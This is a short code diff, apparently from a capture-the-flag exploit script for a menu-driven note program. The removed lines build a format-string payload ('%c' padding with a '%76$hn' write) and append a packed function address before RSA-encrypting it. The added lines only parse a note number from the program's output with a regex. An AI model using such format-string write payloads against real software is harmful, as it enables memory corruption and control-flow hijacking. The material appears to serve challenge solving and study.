@@ -1,7 +1,13 @@
-# 2. rsa_encrypt
-pay = "%{}c".format(0x7c0)
-pay += "%{}$hn".format(76) # base offset 76. 76 + len(pay) / 8
-pay += "A"*(8-len(pay) % 8)
-print(len(pay))
-plain = pay.encode() + p64(help_add)
-enc = rsa_encrypt(plain)
+import re
+
+res = """note created. no 254
+ [e9a51000]- Select Menu -
+1. create note
+2. write note
+3. read note
+4. delete note
+5. exit
+"""
+
+reg = re.compile(r"no.\d{1,3}")
+print(reg.search(res).group().split()[1])
